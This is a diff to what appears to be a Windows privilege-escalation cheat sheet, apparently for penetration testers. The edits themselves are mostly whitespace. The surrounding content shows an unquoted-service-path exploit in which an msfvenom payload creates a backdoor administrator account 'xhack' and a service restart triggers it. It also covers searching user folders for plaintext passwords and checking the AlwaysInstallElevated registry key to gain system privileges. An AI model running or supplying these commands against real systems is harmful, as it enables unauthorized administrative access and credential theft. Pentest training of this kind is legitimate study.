@@ -172,15 +172,15 @@ icacls "C:\ "
 icacls "C:\Program Files"
 icacls "C:\Program Files\Unquoted Path Service"
 ```   
+
 #### Exploit
+
 ```
 #Choose the name of the exploit according to the paths the system will look for the binaries
 #in our example below, we have write access to the "C:\Program Files\Unquoted Path Service\" directory
 C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
 
-#Therefor we choose the name following binary name
---> common.exe
-
+# Therefor we choose the name following binary name --> common.exe
 
 #create exploit
 msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o common.exe
@@ -190,7 +190,7 @@ C:\Program Files\Unquoted Path Service\
 
 #restart service
 sc start unquotedsvc
-```
+```   
 
 ## Registry
 ## Executable File
@@ -199,6 +199,7 @@ sc start unquotedsvc
 Administrators are often lazy and use weak passwords or reuse them. When performing our password mining, we scout for (hashed) passwords that administrators maybe reused for their main account. Further these passwords could also get us access to other services like databases.   
 #### Passwords stored by user
 Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   
+
 ```
 # Check for files in home folders of users with names that could mean they hold passwords
 dir /s C:\Users
@@ -212,6 +213,7 @@ dir /s C:\Users
 ## AllwaysInstallElevated
 When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have **system**.    
 #### detect vulnerability:   
+
 ```
 # check if AlwaysInstallElevated key is set
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
